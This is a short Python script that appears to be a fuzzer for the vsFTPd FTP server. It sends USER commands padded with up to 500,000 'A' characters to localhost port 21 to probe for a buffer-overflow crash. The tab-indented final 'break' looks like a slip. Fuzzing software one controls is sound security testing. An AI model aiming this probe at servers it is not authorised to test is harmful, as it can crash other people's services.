#!/usr/bin/env python3

import socket
import errno

ip = "127.0.0.1" #localhost
port = 21

for length in range(100000, 500000, 10000):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        ok = sock.recv(1024)
        print(ok.decode("utf-8"))

        fuzz = "A" * length

        msg = "USER " + fuzz + "\r\n"
        print("Fuzzing USER ID with length: " + str(len(msg)))

        sock.send(msg.encode())
        sock.settimeout(5.0)
        result = sock.recv(1024)
        sock.settimeout(None)
        print(result.decode("utf-8"))

        msg = "QUIT\r\n"
        sock.send(msg.encode())
        sock.close()

    except socket.error as serr:
        if serr.errno == errno.ECONNREFUSED: #vsftpd 서비스 미작동 시
            print("vsFTPd is not currently working...")

        else:
            print("Failed to connect to ftp : "+ str(serr))
            print("An Error Has Occurred with buffer length : " + str(length))
        
	break
